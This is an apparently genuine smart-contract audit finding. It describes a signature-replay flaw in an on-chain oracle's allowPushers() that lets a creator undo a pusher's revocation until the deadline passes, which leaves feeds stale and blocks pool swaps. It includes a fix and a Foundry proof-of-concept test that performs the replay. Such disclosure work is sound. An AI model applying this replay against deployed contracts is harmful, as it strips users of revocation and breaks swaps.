### Title
Creator can replay a pusher's consent signature to permanently nullify `revokePusher()` within the deadline window, leaving pusher-namespace feeds stale and blocking pool swaps - (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` contains no nonce or used-signature tracking. A creator who holds a pusher's valid consent signature can call `allowPushers` again with the identical `(deadline, pusher, signature)` tuple immediately after the pusher calls `revokePusher()`, re-establishing the delegation in the same block. The pusher's revocation is rendered permanently ineffective until the deadline timestamp expires. During that window every fallback push from the pusher continues to land in the creator's namespace, leaving the pusher's own namespace feeds at price `0` / timestamp `0`. Any pool whose `IPriceProvider` is bound to a `feedIdOf(pusher, slotIndex, positionIndex)` feed will receive a stale quote on every swap call, causing all swaps to revert.

---

### Finding Description

The `allowPushers` function in `CompressedOracleV1` verifies an EIP-191 signature that commits to `(block.chainid, address(this), deadline, pusher, msg.sender)` and then unconditionally writes `namespaceRemapping[pusher] = msg.sender`. [1](#0-0) 

The only replay guard is the deadline check in `_ensureDeadline`: [2](#0-1) 

This check only prevents calls after `deadline`. It does **not** prevent the same `(deadline, signature)` pair from being submitted multiple times while `block.timestamp <= deadline`. There is no nonce, no consumed-signature set, and no check on the current value of `namespaceRemapping[pusher]`.

The code's own NatSpec acknowledges the risk but treats the deadline as sufficient protection: [3](#0-2) 

It is not sufficient. The pusher's self-revocation path clears the mapping: [4](#0-3) 

But the creator can immediately re-write it using the same signature. The fallback push path resolves the namespace from `namespaceRemapping[msg.sender]` at call time: [5](#0-4) 

So every push from the pusher continues to land in the creator's namespace, and the pusher's own namespace (`feedIdOf(pusher, slotIndex, positionIndex)`) remains at the zero-state (price `0`, timestamp `0`).

---

### Impact Explanation

A pool whose price provider is bound to a `feedIdOf(pusher, ...)` feed will call `price(feedId, pool)` during a swap. `getOracleData` for a never-pushed (or perpetually-redirected) slot returns `timestampMs = 0`: [6](#0-5) 

A `timestampMs` of `0` is treated as stale by every consumer (documented as the fail-closed default): [7](#0-6) 

The result is that all swaps on any pool using the pusher's own-namespace feed revert for the entire duration of the deadline window. This is a stale-price execution path reaching live pool swaps and constitutes broken core pool swap functionality.

---

### Likelihood Explanation

The trigger is a semi-trusted creator who already holds the pusher's signed consent (they used it to call `allowPushers` the first time). No new signature is needed. The creator simply re-submits the same calldata. The attack is cheap (one transaction), requires no special privileges beyond holding the original signature, and can be repeated on every block until the deadline expires. Deadlines are chosen by the creator, so a creator who set a long deadline (e.g., 30 days) can sustain the attack for the full window.

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedDelegationSigs` keyed on the signature hash, and revert if the same hash is submitted a second time:

```solidity
bytes32 sigHash = keccak256(signatures[i]);
require(!_usedDelegationSigs[sigHash], "signature already consumed");
_usedDelegationSigs[sigHash] = true;
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, include a per-pusher nonce in the signed payload so each consent can only be used once regardless of deadline.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "contracts/oracles/utils/U64x32.sol";

contract ReplayRevokePoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant CREATOR_KEY = 0xC0FFEE01;
    uint256 constant PUSHER_KEY  = 0xDEADBEEF;

    address creator;
    address pusher;

    function setUp() public {
        oracle  = new CompressedOracleV1(address(this), 0);
        creator = vm.addr(CREATOR_KEY);
        pusher  = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testCreatorReplaysSignatureAfterPusherRevokes() public {
        uint256 deadline = block.timestamp + 30 days; // long deadline chosen by creator

        // 1. Pusher signs consent for creator.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator delegates pusher.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoke cleared");

        // 4. Creator immediately replays the SAME signature — no new consent needed.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds: deadline still valid
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation re-established");

        // 5. Pusher's own-namespace feed is still stale (price 0, ts 0).
        bytes32 ownFeed = oracle.feedIdOf(pusher, 0, 0);
        IOffchainOracle.OracleData memory d = oracle.getOracleData(ownFeed);
        assertEq(d.price, 0,  "pusher own-ns feed is stale");
        assertEq(IOffchainOracle.OracleData(d).timestampMs, 0, "timestamp is zero");
        // Any pool reading ownFeed will see a stale quote and revert on swap.
    }
}
```

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
